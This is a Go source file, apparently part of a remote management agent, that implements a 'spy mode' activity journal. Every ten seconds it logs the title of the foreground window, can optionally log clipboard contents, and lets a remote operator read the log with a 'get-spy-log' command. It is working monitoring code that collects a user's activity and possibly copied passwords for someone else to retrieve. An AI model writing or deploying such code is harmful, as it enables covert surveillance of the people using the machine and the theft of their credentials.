package commands

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Spy activity journal (spy mode only): foreground-window snapshots every
// 10s with consecutive-dup suppression, 5MB rotate. Plaintext on the
// remote box by design — retrieve with get-spy-log, never auto-exfiltrated.

const (
	spyFileName  = "spy.log"
	spyMaxBytes  = 5 << 20
	spyInterval  = 10 * time.Second
	spyClipPref  = "spyclip.txt"
)

var (
	spyMu      sync.Mutex
	spyRunning bool
	spyStop    chan struct{}
)

func spyLogPath() string {
	dir := ""
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	} else {
		dir = filepath.Join(os.TempDir(), "RMM")
	}
	return filepath.Join(dir, spyFileName)
}

func spyAppend(line string) {
	p := spyLogPath()
	_ = os.MkdirAll(filepath.Dir(p), 0755)
	if st, err := os.Stat(p); err == nil && st.Size() > spyMaxBytes {
		_ = os.Remove(p + ".1")
		_ = os.Rename(p, p+".1")
	}
	f, err := os.OpenFile(p, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(time.Now().Format("2006-01-02 15:04:05") + " " + line + "\n")
}

// StartSpyJournal begins background foreground-window capture (idempotent).
func StartSpyJournal() {
	spyMu.Lock()
	defer spyMu.Unlock()
	if spyRunning {
		return
	}
	spyRunning = true
	spyStop = make(chan struct{})
	stop := spyStop
	go func() {
		t := time.NewTicker(spyInterval)
		defer t.Stop()
		last := ""
		for {
			select {
			case <-stop:
				return
			case <-t.C:
			}
			fg, err := getForegroundWindow()
			if err != nil {
				continue
			}
			fg = strings.TrimSpace(fg)
			if fg == "" || fg == last {
				continue // unchanged focus: stay quiet
			}
			last = fg
			spyAppend(fg)
			if clipOn() {
				if txt, err := clipboardGet(); err == nil {
					if txt = strings.TrimSpace(txt); txt != "" {
						spyAppend("CLIP(" + strconv.Itoa(len(txt)) + " chars): " + firstLineClip(txt))
					}
				}
			}
		}
	}()
	log.Printf("[*] Spy journal started")
}

// StopSpyJournal halts capture (idempotent).
func StopSpyJournal() {
	spyMu.Lock()
	defer spyMu.Unlock()
	if !spyRunning {
		return
	}
	close(spyStop)
	spyRunning = false
}

func firstLineClip(s string) string {
	if i := strings.Index(s, "\n"); i >= 0 {
		s = s[:i]
	}
	if len(s) > 200 {
		s = s[:200] + "…"
	}
	return s
}

func clipPrefPath() string {
	dir := ""
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	} else {
		dir = filepath.Join(os.TempDir(), "RMM")
	}
	return filepath.Join(dir, spyClipPref)
}

// clipOn reports whether clipboard capture is enabled (default off).
func clipOn() bool {
	b, err := os.ReadFile(clipPrefPath())
	if err != nil {
		return false
	}
	return strings.TrimSpace(string(b)) == "on"
}

// SetSpyClipboard toggles clipboard capture (on|off).
func SetSpyClipboard(arg string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(arg)) {
	case "on", "1", "true":
		_ = os.MkdirAll(filepath.Dir(clipPrefPath()), 0755)
		if err := os.WriteFile(clipPrefPath(), []byte("on"), 0644); err != nil {
			return "", err
		}
		return "spy clipboard capture: on", nil
	case "off", "0", "false", "":
		_ = os.MkdirAll(filepath.Dir(clipPrefPath()), 0755)
		if err := os.WriteFile(clipPrefPath(), []byte("off"), 0644); err != nil {
			return "", err
		}
		return "spy clipboard capture: off", nil
	default:
		return "", fmt.Errorf("usage: spy-clipboard on|off")
	}
}

// getSpyLog tails the journal (paste-safe, cap 200 lines).
func getSpyLog(arg string) (string, error) {
	n := 60
	if a := strings.TrimSpace(arg); a != "" {
		if v, err := strconv.Atoi(a); err == nil && v > 0 {
			n = v
		}
	}
	out, err := tailFile(spyLogPath(), n)
	if err != nil {
		return "", fmt.Errorf("spy log unavailable (spy mode writes it): %v", err)
	}
	if out == "" {
		return "(spy log empty)", nil
	}
	return out, nil
}
